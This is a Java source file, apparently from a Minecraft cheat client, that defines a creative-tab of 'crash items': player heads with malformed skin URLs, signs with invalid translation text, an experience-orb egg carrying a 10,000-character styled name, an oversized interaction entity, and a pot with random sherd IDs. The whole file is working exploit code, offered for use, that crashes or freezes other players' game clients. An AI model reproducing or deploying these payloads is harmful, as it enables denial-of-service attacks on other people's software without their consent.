package me.nekosarekawaii.foxglove.creativetab.impl;

import de.florianmichael.viafabricplus.protocolhack.ProtocolHack;
import me.nekosarekawaii.foxglove.creativetab.CreativeTab;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import net.raphimc.vialoader.util.VersionEnum;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.Collection;

public class CrashItemsCreativeTab extends CreativeTab {

    public CrashItemsCreativeTab() {
        super(new ItemStack(Items.BARRIER).setCustomName(Text.literal("Crash Items")));
    }

    @Override
    public Collection<ItemStack> entries() {
        final Collection<ItemStack> current = super.entries();
        final VersionEnum targetVersion = ProtocolHack.getTargetVersion();

        if (targetVersion.isOlderThan(VersionEnum.r1_11)) {
            // This head uses a value that has an empty string as url.
            final ItemStack crashHead = new ItemStack(Items.PLAYER_HEAD);
            final NbtCompound nbt = new NbtCompound();
            final NbtCompound skullOwner = new NbtCompound();
            final NbtCompound properties = new NbtCompound();
            final NbtList textures = new NbtList();
            final NbtCompound data = new NbtCompound();
            data.putString("Signature", "RlOgHNDlW3KdoWBda6VoMWqvD21ESva9BC6DvexuutaLdBwLuFpf/5kHVnQV6DcjbON9A8H4QY1D9GiYly468B+KzSpTRo/JeyDYr96uQc9RTq+U62uxxcDodgo4d465RJtx7TXIzVJX00OQqX1xHU3q6Lquk+iV4QFHRd/O3nzFVt8d2iWyArshMtXUZTtoGPthK8JrbWHI+EHBWNfSFU4MM40yD/7BCC/Td23x4LGP+gm4y6N2PyD6WLolGD8qXzRW5T5UMTbABU1/e6V/nAPYz7dTDuGVCh+x9qCDWt0a7Du6/31wo67mKysHD7Jp5QL/AT/uuP6N+DGi2/HeWDZJwm+cdH93mpCmK74cO71m/FwCBuC3QxI8GfhtXkS22dI+5bMEbLTMcrWyWwM1+7nciXQA/CGtmZpSCfiJI595nX4pmIG2YVCVy9OzVsnIjNt0vL5UfIJasWu3GkIOepuHeaE9HZ/Vw/XWncGBEAURitbPeRZj2slSTPoP1sx3J5LrObCY8L1HqazMLYeX5VulR49YJmg7PEQUsi/mQJAwj0xnHx7bCPWiNcMNOFHUoAUF1MDGZvSmiw7cfMClOpp+wzJB1kWnDRQmoCXnsk5nX2wYqiXXqJ6TkuOKk7BhiKjUtTVSv9eyUn2xZfcn9nxcolr0fmNH+brDAsVIMug=");
            data.putString("Value", "ewogICJ0aW1lc3RhbXAiIDogMTY4ODYwNjcyODYzNywKICAicHJvZmlsZUlkIiA6ICJhNDAxNDkxYTAwZTI0OGVmYTZmZjcxMjI2Y2ZhNzU1NCIsCiAgInByb2ZpbGVOYW1lIiA6ICJlZDBjaW5VIiwKICAic2lnbmF0dXJlUmVxdWlyZWQiIDogdHJ1ZSwKICAidGV4dHVyZXMiIDogewogICAgIlNLSU4iIDogewogICAgICAidXJsIiA6ICIiLAogICAgICAibWV0YWRhdGEiIDogewogICAgICAgICJtb2RlbCIgOiAic2xpbSIKICAgICAgfQogICAgfQogIH0KfQ==");
            textures.add(data);
            properties.put("textures", textures);
            skullOwner.putIntArray("Id", new int[]{-1543419622, 14829807, -1493208798, 1828353364});
            skullOwner.put("Properties", properties);
            skullOwner.putString("Name", "ed0cinU");
            nbt.put("SkullOwner", skullOwner);
            crashHead.setNbt(nbt);
            this.putClientsideName(crashHead,
                    Text.literal(
                            Formatting.DARK_RED + Formatting.BOLD.toString() + "Client Crash Head"
                    ),
                    Text.literal(
                            Formatting.YELLOW + Formatting.BOLD.toString() + "Working at <= 1.10.2 (needs to be placed in versions older than 1.8.0)"
                    )
            );
            current.add(crashHead);

            // This head uses a value that has " .minecraft.net" as url.
            final ItemStack crashHeadV2 = new ItemStack(Items.PLAYER_HEAD);
            final NbtCompound nbtV2 = new NbtCompound();
            final NbtCompound skullOwnerV2 = new NbtCompound();
            final NbtCompound propertiesV2 = new NbtCompound();
            final NbtList texturesV2 = new NbtList();
            final NbtCompound dataV2 = new NbtCompound();
            dataV2.putString("Signature", "RlOgHNDlW3KdoWBda6VoMWqvD21ESva9BC6DvexuutaLdBwLuFpf/5kHVnQV6DcjbON9A8H4QY1D9GiYly468B+KzSpTRo/JeyDYr96uQc9RTq+U62uxxcDodgo4d465RJtx7TXIzVJX00OQqX1xHU3q6Lquk+iV4QFHRd/O3nzFVt8d2iWyArshMtXUZTtoGPthK8JrbWHI+EHBWNfSFU4MM40yD/7BCC/Td23x4LGP+gm4y6N2PyD6WLolGD8qXzRW5T5UMTbABU1/e6V/nAPYz7dTDuGVCh+x9qCDWt0a7Du6/31wo67mKysHD7Jp5QL/AT/uuP6N+DGi2/HeWDZJwm+cdH93mpCmK74cO71m/FwCBuC3QxI8GfhtXkS22dI+5bMEbLTMcrWyWwM1+7nciXQA/CGtmZpSCfiJI595nX4pmIG2YVCVy9OzVsnIjNt0vL5UfIJasWu3GkIOepuHeaE9HZ/Vw/XWncGBEAURitbPeRZj2slSTPoP1sx3J5LrObCY8L1HqazMLYeX5VulR49YJmg7PEQUsi/mQJAwj0xnHx7bCPWiNcMNOFHUoAUF1MDGZvSmiw7cfMClOpp+wzJB1kWnDRQmoCXnsk5nX2wYqiXXqJ6TkuOKk7BhiKjUtTVSv9eyUn2xZfcn9nxcolr0fmNH+brDAsVIMug=");
            dataV2.putString("Value", "ewogICJ0aW1lc3RhbXAiIDogMTY4ODYwNjcyODYzNywKICAicHJvZmlsZUlkIiA6ICJhNDAxNDkxYTAwZTI0OGVmYTZmZjcxMjI2Y2ZhNzU1NCIsCiAgInByb2ZpbGVOYW1lIiA6ICJlZDBjaW5VIiwKICAic2lnbmF0dXJlUmVxdWlyZWQiIDogdHJ1ZSwKICAidGV4dHVyZXMiIDogewogICAgIlNLSU4iIDogewogICAgICAidXJsIiA6ICIgLm1pbmVjcmFmdC5uZXQiLAogICAgICAibWV0YWRhdGEiIDogewogICAgICAgICJtb2RlbCIgOiAic2xpbSIKICAgICAgfQogICAgfQogIH0KfQ==");
            texturesV2.add(dataV2);
            propertiesV2.put("textures", texturesV2);
            skullOwnerV2.putIntArray("Id", new int[]{-1543419622, 14829807, -1493208798, 1828353364});
            skullOwnerV2.put("Properties", propertiesV2);
            skullOwnerV2.putString("Name", "ed0cinU");
            nbtV2.put("SkullOwner", skullOwnerV2);
            crashHeadV2.setNbt(nbtV2);
            this.putClientsideName(crashHeadV2,
                    Text.literal(
                            Formatting.DARK_RED + Formatting.BOLD.toString() + "Client Crash Head V2"
                    ),
                    Text.literal(
                            Formatting.YELLOW + Formatting.BOLD.toString() + "Working at <= 1.10.2 (needs to be placed in versions older than 1.8.0)"
                    )
            );
            current.add(crashHeadV2);

        }

        if (targetVersion.isOlderThan(VersionEnum.r1_15)) {

            final ItemStack crashSign = new ItemStack(Items.OAK_SIGN);
            final NbtCompound crashSignNbt = crashSign.getOrCreateNbt();
            final NbtCompound crashSignBlockEntityTag = new NbtCompound();
            final NbtString crashSignText1 = NbtString.of(Text.Serializer.toJson(Text.translatable("translation.test.invalid")));
            final NbtString crashSignText2 = NbtString.of(Text.Serializer.toJson(Text.literal("")));
            final NbtString crashSignText3 = NbtString.of(Text.Serializer.toJson(Text.literal("")));
            final NbtString crashSignText4 = NbtString.of(Text.Serializer.toJson(Text.literal("")));
            crashSignBlockEntityTag.put("Text1", crashSignText1);
            crashSignBlockEntityTag.put("Text2", crashSignText2);
            crashSignBlockEntityTag.put("Text3", crashSignText3);
            crashSignBlockEntityTag.put("Text4", crashSignText4);
            crashSignNbt.put("BlockEntityTag", crashSignBlockEntityTag);
            this.putClientsideName(
                    crashSign,
                    Text.literal(
                            Formatting.RED + Formatting.BOLD.toString() + "Client Crash Sign"
                    )
            );
            current.add(crashSign);

            final ItemStack crashSignV2 = new ItemStack(Items.OAK_SIGN);
            final NbtCompound crashSignNbtV2 = crashSign.getOrCreateNbt();
            final NbtCompound crashSignBlockEntityTagV2 = new NbtCompound();
            final NbtString crashSignText1V2 = NbtString.of(Text.Serializer.toJson(Text.translatable("translation.test.invalid2")));
            final NbtString crashSignText2V2 = NbtString.of(Text.Serializer.toJson(Text.literal("")));
            final NbtString crashSignText3V2 = NbtString.of(Text.Serializer.toJson(Text.literal("")));
            final NbtString crashSignText4V2 = NbtString.of(Text.Serializer.toJson(Text.literal("")));
            crashSignBlockEntityTagV2.put("Text1", crashSignText1V2);
            crashSignBlockEntityTagV2.put("Text2", crashSignText2V2);
            crashSignBlockEntityTagV2.put("Text3", crashSignText3V2);
            crashSignBlockEntityTagV2.put("Text4", crashSignText4V2);
            crashSignNbtV2.put("BlockEntityTag", crashSignBlockEntityTagV2);
            this.putClientsideName(
                    crashSignV2,
                    Text.literal(
                            Formatting.RED + Formatting.BOLD.toString() + "Client Crash Sign V2"
                    )
            );
            current.add(crashSignV2);

        }

        final ItemStack crashEXPSpawnEgg = new ItemStack(Items.SHEEP_SPAWN_EGG);
        final NbtCompound crashEXPSpawnEggNBT = new NbtCompound();
        final NbtCompound crashEXPSpawnEggEntityTag = new NbtCompound();
        crashEXPSpawnEggEntityTag.putString("CustomName", Text.Serializer.toJson(Text.literal("#".repeat(10000)).formatted(
                Formatting.DARK_GREEN, Formatting.BOLD, Formatting.UNDERLINE, Formatting.STRIKETHROUGH, Formatting.ITALIC, Formatting.OBFUSCATED)
        ));
        crashEXPSpawnEggEntityTag.putInt("Value", 1337);
        crashEXPSpawnEggEntityTag.putInt("Count", 999999);
        crashEXPSpawnEggEntityTag.putByte("CustomNameVisible", (byte) 1);
        crashEXPSpawnEggEntityTag.putByte("Glowing", (byte) 1);
        crashEXPSpawnEggEntityTag.putByte("HasVisualFire", (byte) 1);
        crashEXPSpawnEggEntityTag.putString("id", "minecraft:experience_orb");
        crashEXPSpawnEggNBT.put("EntityTag", crashEXPSpawnEggEntityTag);
        crashEXPSpawnEgg.setNbt(crashEXPSpawnEggNBT);
        this.putClientsideName(crashEXPSpawnEgg,
                Text.literal(
                        Formatting.DARK_RED + Formatting.BOLD.toString() + "Crash Experience"
                )
        );
        current.add(crashEXPSpawnEgg);

        if (targetVersion.isNewerThanOrEqualTo(VersionEnum.r1_20tor1_20_1)) {

            final ItemStack sodiumFreezeEntitySpawnEgg = new ItemStack(Items.SALMON_SPAWN_EGG);
            final NbtCompound sodiumFreezeEntitySpawnEggNBT = new NbtCompound();
            final NbtCompound sodiumFreezeEntitySpawnEggEntityTag = new NbtCompound();
            sodiumFreezeEntitySpawnEggEntityTag.putFloat("width", 999999f);
            sodiumFreezeEntitySpawnEggEntityTag.putFloat("height", 999999f);
            sodiumFreezeEntitySpawnEggEntityTag.putString("id", "minecraft:interaction");
            sodiumFreezeEntitySpawnEggNBT.put("EntityTag", sodiumFreezeEntitySpawnEggEntityTag);
            sodiumFreezeEntitySpawnEgg.setNbt(sodiumFreezeEntitySpawnEggNBT);
            this.putClientsideName(sodiumFreezeEntitySpawnEgg,
                    Text.literal(
                            Formatting.DARK_RED + Formatting.BOLD.toString() + "Sodium Freeze Entity"
                    )
            );
            current.add(sodiumFreezeEntitySpawnEgg);

            final ItemStack instantCrashPot = new ItemStack(Items.DECORATED_POT);
            final NbtCompound instantCrashPotNBT = new NbtCompound();
            final NbtCompound instantCrashPotBlockEntityTag = new NbtCompound();
            final NbtList instantCrashSherds = new NbtList();
            instantCrashSherds.add(NbtString.of(RandomStringUtils.random(5).toLowerCase() + ":" + RandomStringUtils.random(5).toUpperCase()));
            instantCrashPotBlockEntityTag.put("sherds", instantCrashSherds);
            instantCrashPotNBT.put("BlockEntityTag", instantCrashPotBlockEntityTag);
            instantCrashPot.setNbt(instantCrashPotNBT);
            this.putClientsideName(instantCrashPot,
                    Text.literal(
                            Formatting.DARK_RED + Formatting.BOLD.toString() + "Instant Crash Pot"
                    )
            );
            current.add(instantCrashPot);

        }

        return current;
    }

}
